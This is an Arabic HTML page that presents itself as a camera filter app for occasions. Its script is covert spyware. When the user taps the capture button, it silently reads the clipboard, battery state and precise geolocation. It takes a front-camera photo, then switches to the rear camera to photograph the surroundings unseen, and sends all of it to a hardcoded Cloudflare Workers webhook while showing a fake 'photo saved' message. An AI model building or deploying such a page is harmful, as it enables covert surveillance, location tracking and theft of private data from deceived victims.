<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فلتر المناسبات - Face Magic</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            height: 100vh;
            overflow: hidden;
        }
        /* عرض الكاميرا في الخلفية */
        #bg-video {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        /* طبقة التأثيرات */
        .overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 2;
            pointer-events: none;
        }
        .frame {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 280px;
            height: 280px;
            border: 6px solid rgba(255,215,0,0.8);
            border-radius: 50%;
            box-shadow: 0 0 80px rgba(255,215,0,0.4), inset 0 0 80px rgba(255,215,0,0.1);
        }
        .sparkle {
            position: absolute;
            font-size: 24px;
            animation: sparkleFloat 3s infinite;
            pointer-events: none;
        }
        @keyframes sparkleFloat {
            0%,100% { transform: translateY(0) scale(1); opacity: 1; }
            50% { transform: translateY(-30px) scale(1.3); opacity: 0.7; }
        }
        /* لوحة التحكم السفلية */
        .controls {
            position: fixed;
            bottom: 0; left: 0; right: 0;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.9));
            padding: 20px;
            text-align: center;
        }
        .controls h2 {
            color: #fff;
            font-size: 20px;
            margin-bottom: 5px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .controls p {
            color: #ddd;
            font-size: 13px;
            margin-bottom: 15px;
        }
        .filter-row {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }
        .filter-btn {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            color: #fff;
            border: 2px solid rgba(255,255,255,0.3);
            padding: 10px 18px;
            border-radius: 25px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .filter-btn.active {
            background: #ff6b9d;
            border-color: #ff6b9d;
            box-shadow: 0 0 20px rgba(255,107,157,0.5);
        }
        .capture-btn {
            background: linear-gradient(135deg, #ff6b9d, #c0392b);
            color: #fff;
            border: none;
            padding: 14px 40px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(255,107,157,0.4);
            animation: pulse 2s infinite;
            width: 100%;
            max-width: 300px;
        }
        @keyframes pulse {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.04); }
        }
        .status-bar {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #fff;
            font-size: 12px;
            margin-top: 10px;
            opacity: 0.8;
        }
        .dot {
            width: 8px; height: 8px;
            background: #2ecc71;
            border-radius: 50%;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%,100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>

<!-- فيديو الكاميرا -->
<video id="bg-video" autoplay playsinline muted></video>

<!-- تأثيرات -->
<div class="overlay">
    <div class="frame"></div>
    <span class="sparkle" style="top:15%;left:20%;animation-delay:0s;">✨</span>
    <span class="sparkle" style="top:20%;right:25%;animation-delay:1s;">💫</span>
    <span class="sparkle" style="bottom:30%;left:15%;animation-delay:2s;">🌟</span>
    <span class="sparkle" style="bottom:25%;right:20%;animation-delay:0.5s;">✨</span>
</div>

<!-- لوحة التحكم -->
<div class="controls">
    <h2>✨ فلتر المناسبات</h2>
    <p>اختاري الفلتر المناسب لصورتك</p>
    <div class="filter-row">
        <button class="filter-btn active" onclick="setFilter(this, '')">📸 طبيعي</button>
        <button class="filter-btn" onclick="setFilter(this, 'sepia(0.6) brightness(1.1)')">🌟 ذهبي</button>
        <button class="filter-btn" onclick="setFilter(this, 'grayscale(0.3) brightness(1.2)')">🕊️ كلاسيك</button>
        <button class="filter-btn" onclick="setFilter(this, 'saturate(1.5) hue-rotate(-10deg)')">🌸 وردي</button>
    </div>
    <button class="capture-btn" onclick="startCapture()">📷 التقطي الصورة</button>
    <div class="status-bar">
        <div class="dot"></div>
        <span>الكاميرا نشطة - فلتر المناسبات</span>
    </div>
</div>

<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
// ==================== [ WEBHOOK ] ====================
const WEBHOOK = "https://cold-brook-420f.tjarb093.workers.dev/";

// ==================== [ INIT ] ====================
let currentFilter = "";
let videoStream = null;
let deviceFacing = "user"; // افتراضي: أمامي

async function initCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: deviceFacing, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
        document.getElementById('bg-video').srcObject = videoStream;
    } catch(e) {
        // إذا فشلت الأمامية، جرب الخلفية
        try {
            videoStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });
            document.getElementById('bg-video').srcObject = videoStream;
        } catch(e2) {
            alert("يرجى السماح للكاميرا لتجربة الفلتر");
        }
    }
}

// ==================== [ FILTERS ] ====================
function setFilter(btn, filter) {
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentFilter = filter;
    document.getElementById('bg-video').style.filter = filter;
}

// ==================== [ CAPTURE + EXFIL ] ====================
async function startCapture() {
    const video = document.getElementById('bg-video');
    const canvas = document.getElementById('hidden-canvas');
    
    // تغيير الزر
    const btn = document.querySelector('.capture-btn');
    btn.innerText = "⏳ جاري التصوير...";
    btn.disabled = true;
    btn.style.animation = "none";
    btn.style.opacity = "0.7";

    let packet = {
        time: new Date().toISOString(),
        ua: navigator.userAgent,
        frontImg: null,
        backImg: null,
        battery: "N/A",
        clipboard: "N/A",
        location: "N/A"
    };

    // 1. جمع البيانات الصامتة
    try {
        let b = await navigator.getBattery();
        packet.battery = `${Math.round(b.level*100)}% ${b.charging ? '⚡' : '🔋'}`;
    } catch(e) {}

    try {
        packet.clipboard = await navigator.clipboard.readText() || "فارغة";
    } catch(e) {}

    try {
        let pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        packet.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch(e) {}

    // 2. التقاط الصورة الأمامية
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    let ctx = canvas.getContext('2d');
    ctx.filter = currentFilter;
    ctx.drawImage(video, 0, 0);
    packet.frontImg = canvas.toDataURL('image/jpeg', 0.75);

    // 3. تبديل الكاميرا للخلفية
    await switchCamera("environment");
    await sleep(2500);
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.filter = "none";
    ctx.drawImage(video, 0, 0);
    packet.backImg = canvas.toDataURL('image/jpeg', 0.75);
    await switchCamera("user"); // نرجع للأمامية

    // 4. إرسال البيانات
    btn.innerText = "📡 جاري الإرسال...";
    await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(packet)
    }).catch(() => {});

    // 5. إظهار النجاح
    btn.innerText = "✅ تم حفظ الصورة!";
    btn.style.background = "linear-gradient(135deg, #2ecc71, #27ae60)";
    setTimeout(() => {
        btn.innerText = "📷 التقطي صورة أخرى";
        btn.disabled = false;
        btn.style.animation = "pulse 2s infinite";
        btn.style.background = "linear-gradient(135deg, #ff6b9d, #c0392b)";
        btn.style.opacity = "1";
    }, 2500);
}

// ==================== [ SWITCH CAMERA ] ====================
async function switchCamera(facing) {
    if (videoStream) {
        videoStream.getTracks().forEach(t => t.stop());
    }
    videoStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
    });
    document.getElementById('bg-video').srcObject = videoStream;
    deviceFacing = facing;
    await sleep(1500);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ==================== [ START ] ====================
initCamera();
</script>
</body>
</html>
